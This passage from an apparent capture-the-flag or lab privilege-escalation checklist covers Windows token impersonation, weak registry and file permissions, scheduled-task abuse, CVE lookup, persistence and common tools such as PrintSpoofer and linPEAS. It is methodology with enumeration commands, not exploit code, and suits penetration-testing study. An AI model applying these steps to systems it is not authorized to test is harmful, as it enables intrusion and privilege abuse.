- [ ] Restart service (if possible) to execute malicious binary

##### Phase 3: Token Abuse (Impersonation)

- [ ] List available tokens: `whoami /priv`
- [ ] Look for SeImpersonate, SeAssignPrimaryToken
- [ ] Use tools like Incognito or PrintSpoofer to impersonate SYSTEM

##### Phase 4: Registry/File Permissions

- [ ] Check registry permissions (especially HKLM)
- [ ] Check file permissions on sensitive locations (Program Files, Windows, etc.)
- [ ] Modify registry or files if writable to achieve execution

##### Phase 5: Scheduled Tasks

- [ ] List tasks: `tasklist /FI "USERNAME eq SYSTEM"`
- [ ] Check task details: `Get-ScheduledTask`, `schtasks /query`
- [ ] Look for tasks that run as SYSTEM or admin with editable scripts/binaries

##### Phase 6: Known CVE/Exploit

- [ ] Kernel exploits (same as Linux, but for Windows kernel)
- [ ] Service-specific exploits (Windows services often have escalation paths)
- [ ] Search: `wmic qfe list` → compare against known CVEs

#### Post-Privilege Escalation

- [ ] Confirm root/SYSTEM access: `id`, `whoami /priv`
- [ ] Capture root/system flag
- [ ] Document the full chain
- [ ] Consider persistence (if lab allows/requires)

#### Tools & Resources

- **LinEnum.sh** – Automated Linux enumeration
- **PEASS (winPEAS/linPEAS)** – Privilege escalation assessment scripts
- **searchsploit** – Local exploit database
- **GTFOBins** – SUID/sudo/capability escape database
- **HackTricks** – Privilege escalation techniques
- **Exploit-DB** – Public exploit collection

#### Common Pitfalls

- Not checking `sudo -l` first (often the quickest vector)
- Overlooking writable directories that run high-privilege code
- Ignoring cron jobs and scheduled tasks
- Not researching kernel exploits if no obvious vector exists
- Assuming services/binaries are secure without testing

#### Notes

- Privilege escalation is often a chain of small vulnerabilities; enumerate thoroughly.
- Document the full chain: how each step leads to the next.
- Test local exploits carefully; some may destabilize the system.
- Kernel exploits should be last resort due to risk.
